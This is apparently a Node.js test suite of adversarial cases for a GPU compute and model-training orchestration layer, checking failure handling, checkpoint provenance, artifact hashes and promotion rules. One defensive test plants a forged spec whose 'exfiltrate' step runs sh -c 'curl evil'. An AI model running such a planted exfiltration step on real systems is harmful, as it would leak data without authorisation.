/**
 * Governed Compute Realization — adversarial certification (Sprint 11).
 *
 * The named adversarial cases not already pinned by the per-sprint suites:
 * provider timeout mid-run, allocation evidence mismatch (reported GPU
 * under-delivery), wrong-run checkpoint resume, artifact hash mismatch
 * against the expected identity, cancel failure, and the promotion
 * boundary: compute completion can NEVER promote a candidate — only an
 * evaluation win can, and `promoted` is derived, not writable.
 *
 * Run with: node --test scripts/unit-compute-adversarial.test.mjs
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const kitApp = path.join(repoRoot, "cli/assets/worker-kits/growthub-custom-workspace-starter-v1/apps/workspace");
const lib = (rel) => pathToFileURL(path.join(kitApp, "lib", rel)).href;

const { executeProviderComputeRun, cancelProviderComputeRun, maybeExecuteProviderComputeForSandboxRun } = await import(lib("compute-execution.js"));
const { COMPUTE_AUTHORITY_KEY_ENV, compileComputeAuthority, verifyComputeAuthoritySeal } = await import(lib("compute-authority.js"));
const { hashComputeValue } = await import(lib("compute-work-spec.js"));
const { deriveComputeLifecycle, deriveComputeArtifactHonesty } = await import(lib("compute-evidence.js"));
const { deriveBenchmarkWins } = await import(lib("distillation-eval-harness.js"));
const { deriveFlywheelState } = await import(lib("distillation-fleet.js"));
const { deriveComputeCustomerState } = await import(lib("compute-customer-state.js"));

const RUN_ID = "trainrun_adv";

function providerRow() {
  return {
    integrationId: "adv-remote",
    Name: "Adversarial remote",
    metadata: {
      computeProvider: {
        schema: "growthub-compute-provider-v1",
        adapterId: "adv-adapter",
        capacityProfiles: ["single-gpu-finetune", "multi-gpu-finetune"],
        availabilityModes: ["on-demand"],
        requiredEnv: [],
        executionLane: "sandbox-local",
        config: {},
      },
    },
  };
}

const CONFIG = { dataModel: { objects: [{ id: "api-registry", objectType: "api-registry", rows: [providerRow()] }] } };

function adapterWith(overrides = {}) {
  return {
    id: "adv-adapter",
    label: "adv",
    description: "",
    locality: "remote",
    describeCapabilities() {
      return { providerId: "adv-remote", adapterId: "adv-adapter", capacityProfiles: ["single-gpu-finetune", "multi-gpu-finetune"], availabilityModes: ["on-demand"], acceleratorClasses: ["any-gpu", "datacenter-gpu", "high-memory-gpu"], maxVramPerGpuGB: 141, maxGpusPerWorker: 8, maxWorkers: 4, supportsCheckpointing: true, supportsResume: true, supportsGangScheduling: true, regions: [], requiredEnv: [] };
    },
    async inspectCapacity(ctx) {
      return { providerId: "adv-remote", capacityProfileId: ctx.capacityProfileId, available: true, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, estimatedTotalUsd: 2, queueLatencySeconds: 0, quoteObservedAt: "2026-07-20T12:00:00.000Z", quoteExpiresAt: "2026-07-20T13:00:00.000Z", quoteRef: "" };
    },
    async allocate(ctx) {
      return { allocationId: "alloc-adv", runRef: { ...ctx.runRef, providerResourceId: "res-adv" }, status: "allocated", idempotencyKeyHash: ctx.idempotencyKeyHash, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: { gpuType: "A100", gpuCount: 4, workers: 1, region: "" } };
    },
    async status() { return []; },
    async collectArtifact() { return null; },
    async cancel(ctx) { return [{ type: "compute-cancelled", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "cx", detail: "" }]; },
    async release(ctx) { return [{ type: "compute-released", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "rx", detail: "" }]; },
    ...overrides,
  };
}

function ioWith(adapter) {
  let clock = Date.parse("2026-07-20T12:00:00.000Z");
  return {
    getAdapter: (id) => (id === "adv-adapter" ? adapter : null),
    listAdapterIds: () => ["adv-adapter"],
    envPresent: () => true,
    resolveEnv: () => "",
    fetchJson: async () => { throw new Error("no network"); },
    now: () => { clock += 1000; return clock; },
    sleep: async () => {},
    maxPolls: 3,
    pollIntervalMs: 0,
  };
}

const REQ8 = { workloadKind: "fine-tune", acceleratorClass: "datacenter-gpu", gpuCount: 8, minVramPerGpuGB: 80, minCpuCores: 8, minRamGB: 64, minDiskGB: 200, checkpointRequired: true, distributed: null, locality: { regions: [], dataResidency: "" }, estimatedDurationMinutes: 60 };

// ---------------------------------------------------------------------------

test("ADVERSARIAL — reported GPU mismatch: an 8-GPU ask answered with 4 GPUs fails closed and releases", async () => {
  const adapter = adapterWith(); // allocates 4 GPUs
  const outcome = await executeProviderComputeRun({
    workspaceConfig: CONFIG,
    trainingRunId: RUN_ID,
    computeAsk: { capacityProfileId: "multi-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit" },
    requirements: REQ8,
    io: ioWith(adapter),
  });
  assert.equal(outcome.result.ok, false);
  assert.match(outcome.result.error, /allocation evidence mismatch/);
  assert.match(outcome.result.error, /asked for 8 GPU/);
  const types = outcome.computeBlock.events.map((e) => e.type);
  assert.ok(types.includes("compute-failed"));
  assert.ok(types.includes("compute-released"), "mismatched capacity is released, not silently trained on");
});

test("ADVERSARIAL — provider timeout mid-run: unobservable status becomes an honest failure with release", async () => {
  const adapter = adapterWith({
    async allocate(ctx) { return { allocationId: "alloc-t", runRef: { ...ctx.runRef, providerResourceId: "res-t" }, status: "allocated", idempotencyKeyHash: ctx.idempotencyKeyHash, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: null }; },
    async status() { throw new Error("ETIMEDOUT: provider API unreachable"); },
  });
  const outcome = await executeProviderComputeRun({
    workspaceConfig: CONFIG,
    trainingRunId: RUN_ID,
    computeAsk: { capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit" },
    requirements: { ...REQ8, gpuCount: 1 },
    io: ioWith(adapter),
  });
  assert.equal(outcome.result.ok, false);
  const failedEvents = outcome.computeBlock.events.filter((e) => e.type === "compute-failed");
  assert.ok(failedEvents.some((e) => /ETIMEDOUT|unobservable/.test(e.detail)), "the timeout is named, not swallowed");
  assert.ok(outcome.computeBlock.events.some((e) => e.type === "compute-release-requested"), "release still attempted");
});

test("ADVERSARIAL — wrong-run checkpoint: a checkpoint from another training run can never satisfy a resume", () => {
  const myRef = { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "p", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-1" };
  const events = [
    { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { ...myRef, providerResourceId: "" }, providerEventId: "", detail: "" },
    { type: "compute-allocated", at: "t", evidenceObservedAt: "t", source: "provider", runRef: myRef, providerEventId: "e1", detail: "" },
    { type: "compute-running", at: "t", evidenceObservedAt: "t", source: "provider", runRef: myRef, providerEventId: "e2", detail: "" },
    { type: "compute-resuming", at: "t", evidenceObservedAt: "t", source: "provider", runRef: myRef, providerEventId: "e3", detail: "" },
  ];
  const foreign = { checkpointId: "ck-other", runRef: { ...myRef, trainingRunId: "some_other_run" }, locator: "s3://ck/other", sha256: "a".repeat(64), step: 999 };
  const lifecycle = deriveComputeLifecycle({ events, checkpoints: [foreign] });
  assert.ok(lifecycle.refused.some((r) => /no proven checkpoint/.test(r.reason)), "the foreign checkpoint does not prove resumability here");
  assert.equal(lifecycle.provenCheckpoints.length, 0);

  const mine = { ...foreign, checkpointId: "ck-mine", runRef: myRef };
  const ok = deriveComputeLifecycle({ events, checkpoints: [mine] });
  assert.equal(ok.provenCheckpoints.length, 1);
  assert.equal(ok.resumed, true);
});

test("ADVERSARIAL — artifact hash mismatch against the expected identity is non-promotable", () => {
  const lifecycle = { terminal: "completed" };
  const artifact = { runRef: {}, kind: "gguf", locator: "s3://out/m.gguf", sha256: "b".repeat(64), verifiedSha256: "b".repeat(64), sizeBytes: 1, evidenceObservedAt: "t" };
  const mismatch = deriveComputeArtifactHonesty({ lifecycle, artifact, expectedSha256: "c".repeat(64) });
  assert.equal(mismatch.promotable, false);
  assert.equal(mismatch.reasonCode, "artifact-hash-mismatch");
  const match = deriveComputeArtifactHonesty({ lifecycle, artifact, expectedSha256: "b".repeat(64) });
  assert.equal(match.promotable, true);
});

test("ADVERSARIAL — cancel failure: the failed cancel is recorded and capacity risk stays visible", async () => {
  const adapter = adapterWith({
    async cancel() { throw new Error("cancel endpoint 500"); },
    async release() { throw new Error("terminate endpoint 500"); },
  });
  const prior = {
    capacityProfileId: "single-gpu-finetune",
    idempotencyKeyHash: "h",
    allocation: { allocationId: "alloc-c", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-c" }, status: "running", idempotencyKeyHash: "h", availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: null },
    events: [
      { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "" }, providerEventId: "", detail: "" },
      { type: "compute-allocated", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-c" }, providerEventId: "e1", detail: "" },
    ],
  };
  const outcome = await cancelProviderComputeRun({ priorCompute: prior, provider: { providerId: "adv-remote", adapterId: "adv-adapter", config: {} }, io: ioWith(adapter) });
  assert.equal(outcome.cancelled, false, "a failed cancel is not a cancellation");
  assert.equal(outcome.capacityMayStillExist, true);
  assert.equal(outcome.costMayAccrue, true);
  assert.match(outcome.reason, /capacity may still exist/i);
});

// ---------------------------------------------------------------------------
// Server-owned authority at the route hook
// ---------------------------------------------------------------------------

const AUTH_ENV = { [COMPUTE_AUTHORITY_KEY_ENV]: "adversarial-suite-key" };

function authorityRequest(overrides = {}) {
  return {
    schema: "growthub-compute-request-v1",
    policy: { mode: "cloud", excludeLocal: true },
    selectionMode: "explicit",
    providerRegistryId: "adv-remote",
    capacityProfileId: "single-gpu-finetune",
    trainingProfileId: "unsloth-qlora-quantize-pipeline",
    baseModel: "gemma3:4b",
    datasetExportId: "export-adv-1",
    outputModelTag: "tuned-adv-v1",
    ...overrides,
  };
}

function authorityConfig({ request = authorityRequest(), compute = null } = {}) {
  return {
    dataModel: {
      objects: [
        { id: "api-registry", objectType: "api-registry", rows: [providerRow()] },
        {
          id: "model-training-run",
          objectType: "model-training-run",
          rows: [{
            trainingRunId: RUN_ID,
            modelTrainingRowId: "workspace-local",
            datasetExportId: "export-adv-1",
            baseModel: "gemma3:4b",
            trainingProfile: "unsloth-qlora-quantize-pipeline",
            status: "running",
            preflight: { ramGB: 16, diskFreeGB: 200, gpu: { present: false, name: "", vramFreeGB: 0 } },
            computeRequest: JSON.stringify(request),
            ...(compute ? { compute: JSON.stringify(compute) } : {}),
          }],
        },
      ],
    },
  };
}

function authorityIo(adapter, workspaceConfig) {
  return {
    ...ioWith(adapter),
    compileAuthority: ({ trainingRunId, request }) => compileComputeAuthority({ workspaceConfig, trainingRunId, request, now: "2026-07-20T12:00:00.000Z", env: AUTH_ENV }),
    verifyAuthoritySeal: (authority) => verifyComputeAuthoritySeal(authority, AUTH_ENV),
    verifyArtifact: async (artifact) => ({ verifiedSha256: artifact.sha256, verificationKind: "test-materialized" }),
  };
}

test("ADVERSARIAL — a browser-authored, self-consistent intent/work spec on the receipt row is ignored: the server-compiled spec governs", async () => {
  // The attacker plants a self-consistent spec (correct self-hashes, wrong
  // content: an attacker-controlled output tag) in the caller-reachable
  // compute column. The route hook must compile its own authority and submit
  // THAT work spec — the planted one must have zero effect.
  const forgedIntentBody = { schema: "growthub-compute-intent-v1", adaptivePlan: { mode: "x", tier: "x", baseModel: "gemma3:4b" }, capacityProfileId: "single-gpu-finetune", requirements: {}, requirementsHash: hashComputeValue({}), policy: { mode: "cloud" }, training: {} };
  const forgedIntent = { ...forgedIntentBody, intentHash: hashComputeValue(forgedIntentBody) };
  const forgedSpecBody = { schema: "growthub-training-execution-spec-v1", intentHash: forgedIntent.intentHash, requirementsHash: forgedIntent.requirementsHash, capacityProfileId: "single-gpu-finetune", trainingRunId: RUN_ID, modelTrainingRowId: "workspace-local", training: { steps: [{ stageId: "exfiltrate", label: "attacker step", bin: "sh", args: ["-c", "curl evil"] }] }, dataset: { exportId: "export-adv-1", path: "", corpusSha256: "" }, output: { modelTag: "attacker-tag", artifactPath: "/tmp/attacker", expectedKinds: [] } };
  const forgedSpec = { ...forgedSpecBody, workSpecHash: hashComputeValue(forgedSpecBody) };

  const seenWorkSpecHashes = [];
  const adapter = adapterWith({
    async allocate(ctx) {
      seenWorkSpecHashes.push(ctx.workSpecHash);
      assert.equal(ctx.workSpec?.output?.modelTag, "tuned-adv-v1", "the SERVER-compiled output identity reaches the provider");
      return { allocationId: "alloc-authority", runRef: { ...ctx.runRef, providerResourceId: "res-authority" }, status: "allocated", idempotencyKeyHash: ctx.idempotencyKeyHash, availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "", releaseConfirmed: false, allocated: { gpuType: "A100", gpuCount: 1, workers: 1, region: "" } };
    },
    async execute(ctx) {
      seenWorkSpecHashes.push(ctx.workSpecHash);
      return [{ type: "compute-queued", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "q1", detail: "" }];
    },
  });
  const workspaceConfig = authorityConfig({
    compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit", intent: forgedIntent, workSpec: forgedSpec, policy: forgedIntent.policy },
  });
  const outcome = await maybeExecuteProviderComputeForSandboxRun({
    workspaceConfig,
    objectId: "model-training-runner",
    name: RUN_ID,
    io: authorityIo(adapter, workspaceConfig),
  });
  assert.ok(outcome, "the run engages the provider lane");
  const serverHash = outcome.computeBlock.authority?.workSpecHash;
  assert.ok(serverHash, "server authority journaled");
  assert.notEqual(serverHash, forgedSpec.workSpecHash);
  for (const seen of seenWorkSpecHashes) assert.equal(seen, serverHash, "every provider boundary saw the server-compiled spec, never the planted one");
  assert.ok(!JSON.stringify(outcome.computeBlock.workSpec).includes("attacker-tag"), "the planted spec never re-enters the journal");
});

test("ADVERSARIAL — governed inputs changed after sealing fail closed BEFORE provider submission", async () => {
  // Seal authority over the original request, journal it, then let the
  // customer request drift (a different output tag). The hook must refuse
  // before allocate/execute — no paid boundary is crossed on stale authority.
  const originalConfig = authorityConfig({});
  const sealed = compileComputeAuthority({ workspaceConfig: originalConfig, trainingRunId: RUN_ID, now: "t", env: AUTH_ENV });
  assert.equal(sealed.ok, true, sealed.reason);

  const driftedConfig = authorityConfig({
    request: authorityRequest({ outputModelTag: "tuned-adv-v2" }),
    compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit", authority: sealed.authority },
  });
  const adapter = adapterWith({
    async allocate() { throw new Error("allocate must never be reached on stale authority"); },
  });
  const outcome = await maybeExecuteProviderComputeForSandboxRun({
    workspaceConfig: driftedConfig,
    objectId: "model-training-runner",
    name: RUN_ID,
    io: authorityIo(adapter, driftedConfig),
  });
  assert.equal(outcome.result.ok, false);
  assert.match(outcome.result.error, /changed after compute authority was sealed/);
  assert.equal(outcome.result.adapterMeta.compute.authorityRefused, true);
});

test("ADVERSARIAL — authority compilation failure (missing output identity) refuses remote compute before any provider call", async () => {
  const config = authorityConfig({ request: authorityRequest({ outputModelTag: "" }) });
  const adapter = adapterWith({
    async allocate() { throw new Error("allocate must never be reached without compiled authority"); },
  });
  const outcome = await maybeExecuteProviderComputeForSandboxRun({
    workspaceConfig: config,
    objectId: "model-training-runner",
    name: RUN_ID,
    io: authorityIo(adapter, config),
  });
  assert.equal(outcome.result.ok, false);
  assert.match(outcome.result.error, /authority compilation failed \(output-identity-missing\)/);
});

test("PROMOTION BOUNDARY — compute completion can never promote: promoted is a derived evaluation verdict only", () => {
  // 1. The eval harness derives `promoted` from measured wins — an empty or
  //    losing result set can never promote, whatever compute reported.
  assert.equal(deriveBenchmarkWins({ results: [] }).promoted, false);
  assert.equal(deriveBenchmarkWins({ results: [
    { taskId: "t1", student: { quality: 0.2 }, baseline: { quality: 0.9 } },
    { taskId: "t2", student: { quality: 0.3 }, baseline: { quality: 0.8 } },
    { taskId: "t3", student: { quality: 0.1 }, baseline: { quality: 0.9 } },
    { taskId: "t4", student: { quality: 0.4 }, baseline: { quality: 0.9 } },
    { taskId: "t5", student: { quality: 0.2 }, baseline: { quality: 0.7 } },
  ] }).promoted, false, "losing candidates are never promoted");

  // 2. A completed+artifact compute receipt WITHOUT a benchmark win keeps
  //    the flywheel's benchmark-promoted step open.
  const receipts = {
    "training-run:model-training:workspace-local": {
      records: [{
        schema: "growthub-local-model-training-run-v1",
        trainingRunId: RUN_ID,
        modelTrainingRowId: "workspace-local",
        status: "completed",
        artifact: { type: "gguf", modelTag: "tuned-v1", path: "/x.gguf", sha256: "d".repeat(64), quantization: "none" },
        distillation: { teacherModel: "", generation: 1, benchmarkWins: null },
        compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune" },
      }],
    },
  };
  const flywheel = deriveFlywheelState({ workspaceConfig: {}, workspaceSourceRecords: receipts, slug: "workspace-local" });
  const promotedStep = flywheel.steps.find((s) => s.id === "benchmark-promoted");
  assert.equal(promotedStep.done, false, "compute completion did not tick the promotion step");

  // 3. And the customer surface says "evaluating", never "promoted".
  const state = deriveComputeCustomerState({
    computeBlock: {
      schema: "growthub-compute-evidence-v1",
      capacityProfileId: "single-gpu-finetune",
      decision: { schema: "growthub-compute-decision-v1", capacityProfileId: "single-gpu-finetune", selectedProviderId: "adv-remote", selectedReasons: [], candidates: [], budget: { mode: "advisory", maxTotalUsd: 0, maxHourlyUsd: 0, allowUnknownCost: false }, selectionMode: "auto", requirements: null, decidedAt: "t", evidenceObservedAt: "t" },
      allocation: { allocationId: "a", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, status: "completed", idempotencyKeyHash: "h", availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "t", releaseConfirmed: true, allocated: null },
      events: [
        { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "" }, providerEventId: "", detail: "" },
        { type: "compute-allocated", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "1", detail: "" },
        { type: "compute-running", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "2", detail: "" },
        { type: "compute-completed", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "3", detail: "" },
        { type: "compute-release-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "", detail: "" },
        { type: "compute-released", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "4", detail: "" },
      ],
      checkpoints: [],
      artifact: { runRef: {}, kind: "gguf", locator: "s3://out/m.gguf", sha256: "d".repeat(64), verifiedSha256: "d".repeat(64), sizeBytes: 1, evidenceObservedAt: "t" },
      evidenceObservedAt: "t",
    },
    benchmarkWins: null,
  });
  assert.equal(state.stateId, "evaluating", "completion without an evaluation win is EVALUATING, never promoted");
});
